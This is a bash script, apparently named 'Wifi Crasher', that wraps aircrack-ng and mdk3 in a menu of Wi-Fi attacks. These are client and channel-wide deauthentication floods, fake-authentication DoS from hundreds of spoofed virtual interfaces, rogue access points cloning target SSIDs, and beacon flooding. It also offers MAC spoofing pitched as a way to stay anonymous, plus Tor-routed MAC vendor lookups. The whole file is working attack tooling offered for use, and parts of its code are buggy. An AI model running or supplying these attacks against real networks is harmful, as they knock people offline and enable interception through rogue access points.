 #!/bin/bash

 #### Colors ####
 
green="\033[32;1m"
yellow="\033[33;1m"
red="\033[31;1m"
purple="\033[37;1m"
cyan="\033[36;1m"

#### Banner ####

Banner(){
echo ${green}
clear
echo  ''' 
\n\n\n 
 _    _ _  __ _    _____               _ 
 | |  | (_)/ _(_)  /  __ \             | |
 | |  | |_| |_ _   | /  \/_ __ __ _ ___| |__    ___ _ __
 | |/\| | |  _| |  | |   |  __/  _ /  __| _ \  / _ \ __|
 \  /\  / | | | |  | \__/\ | | (_| \__ \ | | |  __/ |
  \/  \/|_|_| |_|   \____/_|  \__,_|___/_| |_|\___|_|   
'''
}                                                       


 #### Variables ####

  read -p "Enter youre wifi interface: " Interface
  wifiInterfaceMon="${Interface}mon"
  AirMonitor=airmon-ng
  AirDumper=airodump-ng
  AirAttack=aireplay-ng
  AirBase=airbase-ng
  MDK=mdk3
  Tool=xterm
  sniffer=tcpdump

 #### Menu option


        Menuoption() {
        Banner
           echo     $purple"\n{"$cyan"1"$purple"}"$yellow"--"$green"DeauthAttacks (DOS attacks that disconnects clients from their networks by sending deauth packets)"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"AuthDoSAttacks "
              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"RogueAP's Attacks"
              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Beacon Flooding (Just a super SPAM SSID attack)"
               echo    $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Restart Networking services" 
               echo    $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Spoof MAC of monitor mode Interface (Recommended before do any attack to be anonymous)"
               echo    $purple"{"$cyan"7"$purple"}"$yellow"--"$green"Wireless Networks MAC tracking (Recommended to discover info about devices)"
               echo    $purple"{"$cyan"8"$purple"}"$yellow"--"$green"InterfaceConfCheck (This option show youre wireless hardware info,design and currently conf)"
                echo    $purple"{"$cyan"9"$purple"}"$yellow"--"$green"Exit "
                 echo
                            echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " get 

        if [ $get -eq 1 ];
        then DeauthAttacks
        elif [ $get -eq 2 ];
        then AuthDoSAttacks
        elif [ $get -eq 3 ];
        then RogueAPsAttacks
        elif [ $get -eq 4 ];
        then BeaconFlood
        elif [ $get -eq 5 ];
        then RestartFunctions
        elif [ $get -eq 6 ];
        then MACspooferMonitorMode
        elif [ $get -eq 7 ];
        then MACaddressTracking
        elif [ $get -eq 8 ];
        then interfaceconfcheck
        elif [ $get -eq 9 ];
        then echo ${red}; echo "BYEEE >:)"; exit
        else echo "\nwrong option dude :v"; sleep 2 && Menuoption
        fi
        }



##### Requeriments check ####

requeriments_check(){
echo "checking tool frameworks requeriments..."
xterm -v &>/dev/null && echo "xterm installed..." || echo "You dont have installed xterm." && kill $!;
aircrack-ng &>/dev/null && echo "aircrack-ng installed..." || echo "You dont have installed aicrack-ng" && kill $!;
mdk3 &>/dev/null && echo "mdk3 installed..." || echo "You dont have installed aicrack-ng" && kill $!;
w3m &>/dev/null && echo "w3m installed..." || echo "You dont have installed w3m" && kill $!;
tcpdump &>/dev/null && echo "tcpdump installed..." || echo "You dont have installed tcpdump" && kill $!;
torsocks &>/dev/null && echo "torsocks installed..." || echo "You dont have installed torsocks" && kill $!;
}


##### Monitor mode, scan available networks & select target #####

MonitorMode_checking(){
requeriments_check &&
$AirMonitor start $Interface &>/dev/null && echo "starting monitor mode with ${Interface}" || echo "interface is already in monitor mode...";
}

#### Monitor Mode2 #### 

MonitorMode2(){      
MonitorMode_checking
airodump-ng --output-format kismet --write generated $wifiInterfaceMon & sleep 18 && kill $! && sed -i '1d' generated-01.kismet.csv
echo "\nShowing networks avalaible\n"; echo "\n${Red}SerialNo            GatewayMAC${Red}         Wifi Channel${White}        WifiSSID${White}"
echo "------------------------------------------------------------------------------------------------------------------"
cat generated-01.kismet.csv | awk -F ';' '{print $1 "             "            $4 "           " $6 "                " $3}'
echo "\n${red}┌─[${red}Select Target${red}]──[${red}~${red}]─[${red}Network${red}]:"
read -p "└─────► " targetNumber
SSID=$(sed -n '${targetNumber}p' | cut -d ';' -f 3;); 
MAC=$(sed -n '${targetNumber}p' | cut -d ';' -f 4;);
Channel=$(sed -n '${targetNumber}p' | cut -d ';' -f 6;)
}

MonitorMode_checkNetworkClients(){
MonitorMode2 && echo "Showing clients on ${SSID} network: \n"; airodump-ng --bssid $MAC --channel $Channel $wifiInterfaceMon
}

MonitorMode_specific_channel(){
echo "\n${red}┌─[${red}Select range channel for targets${red}]──[${red}~${red}]─[${red}Network${red}]:"
read -p "└─────►" channel
MonitorMode_checking
airodump-ng --output-format kismet --channel $channel --write generated_chann$channel $wifiInterfaceMon > /dev/null & sleep 15 && kill $!; sed -i '1d' generated-01.kismet.csv
echo "\nShowing networks avalaible\n"; echo "\n${Red}SerialNo            GatewayMAC${Red}         Wifi Channel${White}        WifiSSID${White}"
echo "------------------------------------------------------------------------------------------------------------------"
cat generated_chann$channel-01.kismet.csv | awk -F ';' '{print $1 "             "            $4 "           " $6 "                " $3}';
echo " " > mac_chann_ssidfile && sed -i '1d' mac_chann_ssidfile || echo "mac_chann_ssidfile dont exist, creating file..."
while IFS= read -r mac_chann_ssidfile; do echo "${mac_chann_ssidfile}" | cut -d ';' -f 3,4,6 | awk -F ';' '{print $1 " " $2 " " $3}' >> mac_chann_ssidfile; done < generated_chann$channel-01.kismet.csv
echo "\nShowing targets MAC and channel:\n" && cat mac_chann_ssidfile
}

MonitorMode_specific_channel_withSSID(){
    echo "\n${red}┌─[${red}Select range channel for targets${red}]──[${red}~${red}]─[${red}Network${red}]:"
read -p "└─────►" channel
MonitorMode_checking
airodump-ng --output-format kismet --channel $channel --write generated_chann$channel $wifiInterfaceMon > /dev/null & sleep 15 && kill $!; sed -i '1d' generated-01.kismet.csv
echo "\nShowing networks avalaible\n"; echo "\n${Red}SerialNo            GatewayMAC${Red}         Wifi Channel${White}        WifiSSID${White}"
echo "------------------------------------------------------------------------------------------------------------------"
cat generated_chann$channel-01.kismet.csv | awk -F ';' '{print $1 "             "            $4 "           " $6 "                " $3}';
echo " " > mac_chann_ssid_file && sed -i '1d' mac_chann_ssid_file || echo "mac_chann_ssid_file dont exist, creating file..."
while IFS= read -r mac_chann_ssid_line; do echo "${mac_chann_ssid_line}" | cut -d ';' -f 3,4,6 | awk -F ';' '{print $1 " " $2 " " $3}' >> mac_chann_ssid_file; done < generated_chann$channel-01.kismet.csv
echo "\nShowing targets MAC and channel:\n" && cat mac_chann_ssid_file
}

#### MAC spoofer/tracking for monitor mode ####

MACspooferMonitorMode(){
MonitorMode_checking && sleep 3 &&
echo $purple "\n╭─"$green"Put youre fake MAC address for the monitor mode interface (-_-) "$purple
read -p " ╰─$ " addressFaker
sudo ip link set dev $wifiInterfaceMon down; sudo ip link set dev $wifiInterfaceMon address $addressFaker; sudo ip link set dev $wifiInterfaceMon up
echo "\nshowing results:\n" && iw dev $wifiInterfaceMon info;
}

MonitorModeforMACtracking(){
MonitorMode_checking && sleep 5 &&
xterm -e airodump-ng --output-format kismet --write generated $wifiInterfaceMon & sleep 18 && kill $!
sed -i '1d' generated-01.kismet.csv &&
echo "\nShowing networks avalaible\n"; echo "\n${Red}SerialNo            GatewayMAC${Red}         Wifi Channel${White}        WifiSSID${White}"
echo "------------------------------------------------------------------------------------------------------------------"
cat generated-01.kismet.csv | awk -F ';' '{print $1 "             "            $4 "           " $6 "                " $3}'
}


##### Deauth attack functions ####

DeauthAttacks(){
        
            echo    $purple"\n{"$cyan"1"$purple"}"$yellow"--"$green"Client Deauth (Quicks a client that you want from a network)"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Network Deauth (Quicks out by broadcast clients from one network)"
              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Broadcast Range channel Deauth (Same than option 2 but for all wifi networks avalaible on the same channel at the same time)"
              echo      $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Back to menu"
                echo
                        echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " deauth
        if [ $deauth -eq 1 ];
        then ClientDeauth
        elif [ $deauth -eq 2 ];
        then NetworkDeauth
        elif [ $deauth -eq 3 ];
        then RangeDeauth
        elif [ $deauth -eq 4 ];
        then Menuoption
        else echo "\nBURRRRRRRR that option doesn't exist lmao :v"; sleep 2; echo "\nput again the option :D\n"; DeauthAttacks
        fi
}


 #### Client Deauth ####

ClientDeauth(){  
MonitorMode_checkNetworkClients && sleep 3 &&
read -p "\nPaste the target client bssid: " clientmac && sudo $Tool -fg red -e $AirAttack -0 1000000 -a $MAC -c $clientmac $wifiInterfaceMon
}

 #### Network Deauth ####

NetworkDeauth(){
MonitorMode2 &&
sudo $Tool -e airodump-ng --channel $Channel $wifiInterfaceMon &
sudo $Tool -fg red -e $AirAttack -0 100000 -a $MAC $wifiInterfaceMon
}

 #### Range Deauth ####

RangeDeauth(){
MonitorMode_specific_channel && sleep 3 &&
ls attackdeauthfile.sh 2>/dev/null && echo " " > attackdeauthfile.sh || echo "\nfile attackdeauthfile.sh dont exist, creating file...\n" &&
while IFS= read -r attackdeauth_file; do echo "${attackdeauth_file}" | awk '{print "xterm -fg red -e aireplay-ng -0 100000000 -a " $1}' >> attackdeauthfile.sh; done < mac_channfile;
sed -i "s/$/ ${wifiInterfaceMon} \&/" attackdeauthfile.sh && echo "\nStarting range channel deauth broadcast attack!!!\n" &&
sed -i '1d' attackdeauthfile.sh 2>/dev/null && sudo xterm -e airodump-ng --channel $channel $wifiInterfaceMon & sudo sh attackdeauthfile.sh
}

#### Fake Auth Attacks ####

AuthDoSAttacks(){
echo $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Fake Auth AP"
echo $purple"{"$cyan"2"$purple"}"$yellow"--"$green"AP Auth (Auth with multiple fake MACs for a exclusive AP)"
echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"AP Auth in range (The same than option 2 but in all AP's from one specific channel)"
echo $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Craft Virtual interfaces for attack (Required for option 2,3)"
echo $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Delete Virtual interfaces for attack"
echo $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Spoof MAC address of virtual interfaces for attack (Required for option 2,3,4)"
echo $purple"{"$cyan"7"$purple"}"$yellow"--"$green"Back to menu"           
echo $purple "\n╭─"$green"Select Attack mode (-_-) "$purple
read -p " ╰─$ " auth
if [ $auth -eq 1 ]; 
then FakeAuthAP
elif [ $auth -eq 2 ];
then DoSAuthAP
elif [ $auth -eq 3 ];
then DoSRangeAuthAP
elif [ $auth -eq 4 ];
then virtiface_crafter
elif [ $auth -eq 5 ];
then virtiface_deleter
elif [ $auth -eq 6 ];
then spoof_mac_ifaces
elif [ $auth -eq 7 ];
then Menuoption
else echo "Bad option..."; sleep 2; AuthDoSAttacks
fi
}

#### Fake Auth to AP ####

FakeAuthAP(){
fakeMAC=E6:EF:59:81:6A:DD
MonitorMode2 &&
echo "\nstarting fake Auth attack!!!\n"
sudo $Tool -e $AirDumper --bssid $MAC -c $Channel $wifiInterfaceMon &
sudo $Tool -e $AirAttack -1 0 -a  $MAC -h $fakeMAC $wifiInterfaceMon &
sudo $Tool -e $AirDumper --bssid $MAC $wifiInterfaceMon
}

#### DOS Fake Auth to AP ####

DoSAuthAP(){
MonitorMode2 &&
numINT=1000
echo "starting DoS fake AuthAP..."
sudo $Tool -e $AirDumper --bssid $MAC -c $Channel $wifiInterfaceMon &
for i in $(seq $numINT); do
current_interface="mon$i"
current_mac="$(ip link show $current_interface | awk '/link/ {print $2}')"
echo "Current interface: $current_interface"; echo "Current mac: $current_mac"
sudo $Tool -e $AirAttack -1 0 -a "$MAC" -h "$current_mac" "$current_interface" & sleep 2 > /dev/null
done
}

#### DOS Fake Auth to Range channel AP ####

DoSRangeAuthAP(){
#MonitorMode_specific_channel && 
echo "In develop"
}


#### Virtual interface crafter and deleter####
virtiface_crafter(){
MonitorMode_checking && sleep 3 &&
echo '''
#!/bin/bash
read -p "Enter interface in monitory mode: " wifiInterfaceMon
for i in {1..1000}; do 
sudo iw dev $wifiInterfaceMon interface add mon$i type monitor && echo " interface: ${i} crafted!!!"; done || echo "Error to craft mon${i} interface"
echo "Showing virtual interfaces crafted: "; sudo ip link show | grep mon; echo "\n"
''' > crafter.sh && bash crafter.sh
}

virtiface_deleter(){
echo '''
#!/bin/bash
for i in {1..1000}; do 
sudo iw dev mon$i del && echo "interface: mon${i} deleted!!"; done || echo "Error to delete mon${i} interface";
''' > deleter.sh && bash deleter.sh && rm crafter.sh
}

spoof_mac_ifaces(){
echo '''
#!/bin/bash
file="FAKEMAList.txt"; mapfile -t mac_array < "$file"; Numint=1000 

for ((mac_start=1; mac_start<=Numint; mac_start++)); do
    for i in {1..1000}; do
        if [ ${#mac_array[@]} -eq 0 ]; then
            exit 1
        fi
        random=$((RANDOM % ${#mac_array[@]}))
        macspoof="${mac_array[random]}"

        if ip link show "mon$i" > /dev/null 2>&1; 
        then
        echo "crafting interface: mon${i} with MAC: ${macspoof}"
        sudo ip link set dev "mon$i" down; sudo ip link set dev "mon$i" address "$macspoof"; sudo ip link set dev "mon$i" up
        else echo "Interface mon$i doesnt exist."
        fi
        unset mac_array[random]; mac_array=("${mac_array[@]}")
    done
done

''' >> spoofmacs.sh; bash spoofmacs.sh
}

#### Rogue AP attacks ####

RogueAPsAttacks(){

echo $purple"{"$cyan"1"$purple"}"$yellow"--"$green"RogueAP to 1 network"
echo $purple"{"$cyan"2"$purple"}"$yellow"--"$green"RogueAP to range channel (all 2.4GHz networks in one channel)"
echo $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Back to menu"
echo $purple "\n╭─"$green"Select Attack mode (-_-) "$purple
read -p " ╰─$ " auth
  
if [ $auth -eq 1 ];
then Rogue1AP
elif [ $auth -eq 2 ];
then RangeRogueAP
elif [ $auth -eq 3 ];
then Menuoption
else                  
echo "\nah ah ah thats not correct :)\n"                  
RogueAPsAttacks
fi
}

#### Rogue1AP ####

Rogue1AP(){
MonitorMode2 &&
sudo $Tool -fg red  -e $AirBase -a $MAC -e $SSID -c $Channel $wifiInterfaceMon     
}

#### RangeRogueAP ####

RangeRogueAP(){
MonitorMode_specific_channel_withSSID &&
while IFS= read -r attack_rogue_ap; do echo "${attack_rogue_ap}" | awk "xterm -fg green -e airbase-ng -a " $2 " -e " $1 "  -c " $3  >> attack_rogue_ap.sh; done < mac_chann_ssid_file;
sed -i "s/$/ ${wifiInterfaceMon} \&/" attack_rogue_ap.sh; echo "Starting RogueAP attack in all networks from channel ${channel}\n"; sudo sh attack_rogue_ap.sh
}


#### Realtime attack sniffing packets####

Realtimer(){
$Tool -fg green -e $sniffer -i $wifiInterfaceMon 
}

#### Beacon flooding option menu ####

BeaconFlood(){
MonitorMode_checking && sleep 3 &&
echo "\nYou want to see the avalaible network channels in youre area ???"
read -p " Press --> 1 for Yes OR --> 2 for No $: " get
if [ $get -eq 1 ];
then sudo xterm -e $AirDumper $wifiInterfaceMon & BeaconFlood
elif [ $get -eq 2 ];
then echo "\nstarting the 'joke mode'\n"; sleep 2 && Election
else echo "\nAAAAAA my eyes put glasses lmfao...\n"; BeaconFlood
fi
}

#### Beacon flood attack options ####

Election(){
echo "\nYou want to do a personalized attack ???\n" 
read -p " Press 1 for Yes OR 2 for No: $ " get

if [ $get -eq 1 ];
then BeaconsPersonalized
elif [ $get -eq 2 ];
then BeaconsDefault
else echo "\nIncorrect..."; sleep 2; echo try again dude...; Election
fi
}

BeaconsPersonalized(){
echo $purple "╭─"$green"Put the name for fake AP's (-_-) "$purple
read -p " ╰─$ " get
for i in {1..100}; do echo $get$i >> names; done;
echo "starting personalized beacon flood attack"; echo "starting stream attack"; Realtimer &
$Tool -e $MDK b -f names -s 9000000000000000000 $wifiInterfaceMon
}

BeaconsDefault(){
echo "\nstarting stream attack\n"; echo "starting default attack"; Realtimer &
sudo xterm -e $MDK b -s 9000000000000000000 $wifiInterfaceMon
}


#### Configuration status from networking services and monitor mode interface ####

RestartFunctions(){

echo    $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Stop Monitor mode interface"
echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Start all networking services"
echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Show status of all networking services"
echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Stop all networking services\n"
echo $purple "Choose one number option╭─"$green" (-_-) "$purple
read -p " ╰─$ " restart

if [ $restart -eq 1 ];
then echo "Restarting Network services..." && $AirMonitor stop $wifiInterfaceMon &> /dev/null || echo "${wifiInterfaceMon} isn't in monitor mode"
elif [ $restart -eq 2 ];
then sudo systemctl start NetworkManager; sudo systemctl start avahi-daemon.socket; sudo systemctl start avahi-daemon.service
elif [ $restart -eq 3 ];
then 
echo "\n"; sudo systemctl status avahi-daemon.socket; echo "\n"
sudo systemctl status avahi-daemon; echo "\n"; sudo systemctl status NetworkManager; echo "\n"; sudo systemctl status wpa_supplicant.service
elif [ $restart -eq 4 ];
then 
sudo systemctl stop wpa_supplicant.service; sudo systemctl stop NetworkManager; 
sudo systemctl stop avahi-daemon.socket; sudo systemctl stop avahi-daemon
else echo "\nPut an avalaible option please...\n"; RestartFunctions
fi
}

#### MAC address tracking and fingerprint  ####

MACaddressTracking(){
MonitorModeforMACtracking && sleep 3 &&
echo "\nsending scanner dumped info to >> AP's.txt" && sleep 3 &&
awk -F ';' '{print "     " $4 }' generated-01.kismet.csv >> AP's'.txt &&
echo "\n"; cat AP's'.txt; echo "\nExtracting : characters from AP's.txt and Redirecting content to output.txt\n"; sleep 3 &&
awk -F ':' '{print " " $1$2$3$4$5$6}' AP's'.txt > output.txt; echo "\n"; cat output.txt; echo "\nDeleting APs file..."; sleep 3 &&
rm -r AP's'.txt; echo "\nDeleting spaces and Unnecessary content from: (output.txt)\n"; sed -i 's/^[[:space:]]*//' output.txt &&
sed -i '/BSSID/d' output.txt; echo "\n"; cat output.txt; airmon-ng stop $wifiInterfaceMon &>/dev/null || echo "${wifiInterfaceMon} isn't in monitor mode" && sleep 6
source torsocks on && count=1 &&
while IFS= read -r name || [ -n "${name}" ]; do url="https://aruljohn.com/mac/${name}" && results="mac${count}.txt" && sleep 1 && w3m "${url}" >> "$results" 2>&1 count=$((count+1)); done < output.txt &&
echo "MAC address tracking finished wait..." && sleep 3; echo "Preparing Results..." && sleep 3 &&
cat mac*.txt | grep -E "MAC Address|Vendor      |Address     |Block Size  |Block Range " | grep -Ev "is a block|Home|lookup|single|OUI" >> resultsMACS.txt
clear && sudo sed -i '5~5 G' resultsMACS.txt && cat resultsMACS.txt; echo "\nDeleting data files..."; rm -fr output.txt generated-01.kismet.csv resultsMACS.txt; rm -r mac*;
}

#### Interface conf check ####

interfaceconfcheck(){
iwconfig
echo "\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n"
sudo lshw -class network || echo "lshw not installed..." && sudo apt update &>/dev/null && sudo apt install lshw -y &>/dev/null
echo "\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n"
iw list

}

#### Functions call ####

FuncioRecon(){
Banner    
Menuoption
}     
FuncioRecon                                                  
